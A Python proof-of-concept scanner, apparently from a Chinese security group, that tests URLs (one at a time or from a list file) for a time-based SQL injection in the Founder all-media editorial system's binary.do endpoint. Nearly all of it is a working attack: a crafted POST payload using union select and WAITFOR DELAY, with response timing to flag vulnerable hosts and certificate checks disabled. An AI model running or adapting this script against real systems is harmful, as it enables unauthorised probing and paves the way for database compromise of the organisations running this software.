#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import requests
import argparse
import time
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略不安全请求的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_vulnerability(url):
    try:
        # 构造完整的攻击URL
        attack_url = url.rstrip('/') + "/newsedit/newsplan/task/binary.do"
        attack_payload = """TableName=DOM_IMAGE+where+REFID%3D-1+union+select+%271%27%3B+WAITFOR+DELAY+%270%3A0%3A3%27%3Bselect+DOM_IMAGE+from+IMG_LARGE_PATH&FieldName=IMG_LARGE_PATH&KeyName=REFID&KeyID=1"""

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': '*/*',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate'
        }

        start_time = time.time()
        response = requests.post(attack_url, headers=headers, data=attack_payload, verify=False, timeout=10)
        elapsed_time = time.time() - start_time

        if 3 < elapsed_time < 5:
            print(f"{RED}URL [{url}] 可能存在方正全媒体采编系统binary.do存在SQL注入漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except requests.exceptions.Timeout:
        print(f"URL [{url}] 请求超时，可能存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在方正全媒体采编系统binary.do存在SQL注入漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()
